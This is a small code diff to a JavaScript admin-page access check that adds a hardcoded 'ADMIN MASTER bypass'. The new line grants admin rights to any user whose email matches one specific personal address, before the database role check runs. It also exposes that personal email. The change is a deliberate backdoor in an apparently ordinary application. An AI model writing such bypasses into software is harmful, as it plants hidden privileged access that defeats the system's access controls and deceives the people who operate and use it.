@@ -145,6 +145,10 @@ function AdminPage() {
         console.warn("Admin check: No user found");
         return false;
       }
+      
+      // ADMIN MASTER bypass
+      if (user.email === "victorsampaio133@gmail.com") return true;
+
       const { data, error } = await supabase.rpc("has_role", { _user_id: user.id, _role: "admin" });
       if (error) {
         console.error("Admin role check error:", error);
